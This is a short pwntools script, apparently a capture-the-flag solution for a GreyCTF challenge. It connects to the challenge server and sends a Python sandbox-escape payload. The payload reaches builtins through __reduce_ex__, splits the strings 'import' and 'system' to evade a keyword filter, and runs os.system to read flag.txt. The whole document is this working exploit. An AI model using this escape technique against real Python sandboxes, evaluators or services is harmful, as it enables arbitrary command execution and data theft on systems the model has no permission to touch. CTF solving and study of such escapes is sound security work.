from pwn import *

io = remote("greyctf.jro.sg", 36267)

payload = '''
[].__reduce_ex__(3)[0].__builtins__["__imp""ort__"]("o""s").__dict__['sy''stem']('cat flag.txt')
'''.strip()

io.sendlineafter(b'>>>', payload.encode())

io.interactive()